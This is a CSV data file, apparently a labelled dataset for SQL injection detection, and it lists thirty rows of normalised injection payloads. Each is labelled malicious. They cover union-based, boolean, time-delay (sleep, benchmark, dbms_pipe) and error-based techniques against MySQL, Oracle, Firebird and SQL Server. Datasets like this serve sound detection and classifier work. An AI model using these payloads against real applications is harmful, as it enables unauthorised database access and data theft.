row_index,payload_norm,label,sqli_type_hint
10620,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""xsfg"" like ""xsfg",1,
10621,-2516 ) where 3349 = 3349 or 4855 = 1806--,1,
10622,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
10623,1' ) as xqbq where 1619 = 1619 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
10624,"-2782"" union all select 2109,2109,2109#",1,
10625,1' ) as irck where 3660 = 3660 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,
10626,"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
10627,"1'+ ( select 'vedi' where 2774 = 2774 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
10628,1' ) where 6408 = 6408,1,
10629,"1%' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",1,
10630,"-3230"" ) ) as kbxc where 5007 = 5007 or 2107 = 8818",1,
10631,1' ) and ( 3020 = 3020 ) *6703 and ( 'lhfa' = 'lhfa,1,
10632,"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""aall"" like ""aall",1,
10633,1'|| ( select 'dyuw' from dual where 2037 = 2037,1,
10634,"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp",1,
10635,"-2838"" where 5442 = 5442 union all select 5442#",1,
10636,"1"" ) as lexx where 2892 = 2892 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
10637,"1"" ) where 6072 = 6072 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
10638,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tpcm' like 'tpcm",1,
10639,"1' where 6905 = 6905 union all select null,null,null,null,null,null#",1,
10640,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",1,
10641,"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",1,
10642,"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
10643,"1"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
10644,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'lgcw' = 'lgcw",1,
10645,"1%' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",1,
10646,"1"" ) as cfed where 8220 = 8220 union all select null,null,null,null,null,null,null,null,null#",1,
10647,-8876' ) ) or 3038 = 3038,1,
10648,"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'zkuz",1,
10649,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",1,
